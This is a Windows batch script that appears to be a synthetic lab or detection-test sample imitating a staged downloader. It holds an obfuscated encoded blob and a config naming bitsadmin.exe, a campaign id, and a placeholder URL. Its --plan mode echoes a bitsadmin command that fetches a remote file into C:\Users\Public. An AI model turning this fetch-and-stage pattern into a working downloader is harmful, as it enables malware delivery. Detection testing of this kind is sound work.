@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:reversed_text|rotate_left

rem HUNTRESS-MATERIAL:=guwIzlxgBHxmJMZoRswapszCju54SswYau5KTO6crOk4as0YTs6gir5krs5qiLdGqH0oLM4+qM2SzM+oLMycJHxEDGYIDmcehs0YLM7cLNXKjN4aLM8KzlxgBHxmJMZoRswe5FdmDO6oDteYTu64bMYwRsZCTGaELsWc7s0CDu2CbseILtvc7s0CDu2CbM+Kzt3crnyOLs6OztwY7L6wrM34LP5orM5+atxCTM2YLMz6BN4CTuz4Lmeozt6ebsvK7swobO+KDvycxt0ajswmju0ErH5KjO4Cjsw4rM2SzsvKju0k7OWKju3arM5+qM5Sru4GLsemDuyobO+ipH7

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set item0=v=1^|steps=acquire_remote,write_file^|adapter=bitsadmin.exe^|stage_
set item1=count=1^|graph=fallback_retry^|next_language=none^|campaign_id=camp
set item2=aign-ab42a3b80c^|url=https://ab42a3b80c.example.invalid/90d00bb9.
set item3=dat^|file_path=C:\Users\Public\HuntressLab\stage-ab42a3b80c.dat

goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_arithmetic=f178b2ff"

ver >nul
if errorlevel 1 exit /b 1
set "item9=!item0!!item1!!item2!!item3!"

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe acquire https://ab42a3b80c.example.invalid/90d00bb9.dat to C:\Users\Public\HuntressLab\stage-ab42a3b80c.dat

exit /b 0

